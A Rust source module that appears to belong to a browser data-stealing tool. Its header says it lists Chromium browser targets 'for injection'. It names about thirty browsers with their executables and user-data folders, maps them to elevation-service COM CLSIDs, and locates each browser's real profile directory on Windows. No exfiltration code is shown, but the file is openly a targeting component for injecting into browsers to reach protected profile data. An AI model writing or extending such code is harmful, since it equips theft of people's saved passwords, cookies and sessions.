//! Chromium browser targets: exe name + user data path for injection.
//! Uses fallback CLSIDs for elevation services (no registry scanning).

use std::collections::HashMap;

#[derive(Clone, Copy)]
pub enum DataRoot {
    Local,
    Roaming,
}

#[derive(Clone)]
pub struct ChromiumTarget {
    pub name: String,
    pub exe: String,
    pub user_data_rel: String,
    pub root: DataRoot,
    #[allow(dead_code)]
    pub clsid: String,
}

fn targets() -> Vec<ChromiumTarget> {
    vec![
        ChromiumTarget { name: "Chrome".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Chrome Beta".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome Beta\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Chrome Dev".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome Dev\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Chrome Canary".into(), exe: "chrome.exe".into(), user_data_rel: r"Google\Chrome SxS\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Chromium".into(), exe: "chrome.exe".into(), user_data_rel: r"Chromium\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Edge".into(), exe: "msedge.exe".into(), user_data_rel: r"Microsoft\Edge\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Edge Beta".into(), exe: "msedge.exe".into(), user_data_rel: r"Microsoft\Edge Beta\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Edge Dev".into(), exe: "msedge.exe".into(), user_data_rel: r"Microsoft\Edge Dev\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Brave".into(), exe: "brave.exe".into(), user_data_rel: r"BraveSoftware\Brave-Browser\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Brave Beta".into(), exe: "brave.exe".into(), user_data_rel: r"BraveSoftware\Brave-Browser-Beta\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Brave Nightly".into(), exe: "brave.exe".into(), user_data_rel: r"BraveSoftware\Brave-Browser-Nightly\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Opera".into(), exe: "opera.exe".into(), user_data_rel: r"Opera Software\Opera Stable".into(), root: DataRoot::Roaming, clsid: String::new() },
        ChromiumTarget { name: "OperaGX".into(), exe: "opera.exe".into(), user_data_rel: r"Opera Software\Opera GX Stable".into(), root: DataRoot::Roaming, clsid: String::new() },
        ChromiumTarget { name: "Opera Neon".into(), exe: "opera.exe".into(), user_data_rel: r"Opera Software\Opera Neon\User Data".into(), root: DataRoot::Roaming, clsid: String::new() },
        ChromiumTarget { name: "Vivaldi".into(), exe: "vivaldi.exe".into(), user_data_rel: r"Vivaldi\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Yandex".into(), exe: "browser.exe".into(), user_data_rel: r"Yandex\YandexBrowser\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "CocCoc".into(), exe: "browser.exe".into(), user_data_rel: r"CocCoc\Browser\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "CentBrowser".into(), exe: "chrome.exe".into(), user_data_rel: r"CentBrowser\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "360Chrome".into(), exe: "360chrome.exe".into(), user_data_rel: r"360Chrome\Chrome\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Epic Privacy Browser".into(), exe: "epic.exe".into(), user_data_rel: r"Epic Privacy Browser\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Uran".into(), exe: "uran.exe".into(), user_data_rel: r"uCozMedia\Uran\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "7Star".into(), exe: "7star.exe".into(), user_data_rel: r"7Star\7Star\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Torch".into(), exe: "torch.exe".into(), user_data_rel: r"Torch\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Kometa".into(), exe: "kometa.exe".into(), user_data_rel: r"Kometa\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Orbitum".into(), exe: "orbitum.exe".into(), user_data_rel: r"Orbitum\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Amigo".into(), exe: "amigo.exe".into(), user_data_rel: r"Amigo\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Sputnik".into(), exe: "sputnik.exe".into(), user_data_rel: r"Sputnik\Sputnik\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Slimjet".into(), exe: "slimjet.exe".into(), user_data_rel: r"Slimjet\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Iridium".into(), exe: "iridium.exe".into(), user_data_rel: r"Iridium\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Thorium".into(), exe: "thorium.exe".into(), user_data_rel: r"Thorium\User Data".into(), root: DataRoot::Local, clsid: String::new() },
        ChromiumTarget { name: "Arc".into(), exe: "Arc.exe".into(), user_data_rel: r"The Browser Company\Arc\User Data".into(), root: DataRoot::Local, clsid: String::new() },
    ]
}

fn fallback_canonical_clsid(name: &str) -> Option<&'static str> {
    match name {
        "Chrome" => Some("{708860E0-F641-4611-8895-7D867DD3675B}"),
        "Chrome Beta" => Some("{DD2646BA-3707-4BF8-B9A7-038691A68FC2}"),
        "Chrome Dev" => Some("{DA7FDCA5-2CAA-4637-AA17-0740584DE7DA}"),
        "Chrome Canary" => Some("{704C2872-2049-435E-A469-0A534313C42B}"),
        "Edge" => Some("{1FCBE96C-1697-43AF-9140-2897C7C69767}"),
        "Brave" => Some("{576B31AF-6369-4B6B-8560-E4B203A97A8B}"),
        "Chromium" | "Vivaldi" | "Opera" | "Yandex" | "CocCoc" | "CentBrowser"
        | "360Chrome" | "Epic Privacy Browser" | "Uran" | "7Star" | "Torch"
        | "Kometa" | "Orbitum" | "Amigo" | "Sputnik" | "Slimjet" | "Iridium"
        | "Thorium" | "Arc" => Some("{708860E0-F641-4611-8895-7D867DD3675B}"),
        _ => None,
    }
}

/// Returns canonical CLSIDs for browser elevation services (no registry scanning).
pub fn discover_elevation_services() -> HashMap<String, String> {
    let mut map: HashMap<String, String> = HashMap::new();
    for t in targets() {
        if let Some(c) = fallback_canonical_clsid(&t.name) {
            map.insert(t.name.clone(), c.to_string());
        }
    }
    map
}

pub fn find_target(name: &str) -> Option<ChromiumTarget> {
    let name_lower = name.to_lowercase();
    targets().into_iter().find(|t| t.name.to_lowercase() == name_lower)
}

pub fn find_real_profile_dir(browser_name: &str) -> Option<std::path::PathBuf> {
    let local = std::env::var("LOCALAPPDATA").ok()?;
    let roaming = std::env::var("APPDATA").ok()?;
    let target = find_target(browser_name)?;
    let base = match target.root {
        DataRoot::Local => std::path::PathBuf::from(local),
        DataRoot::Roaming => std::path::PathBuf::from(roaming),
    };
    let profile = base.join(&target.user_data_rel);
    if profile.exists() { Some(profile) } else { None }
}
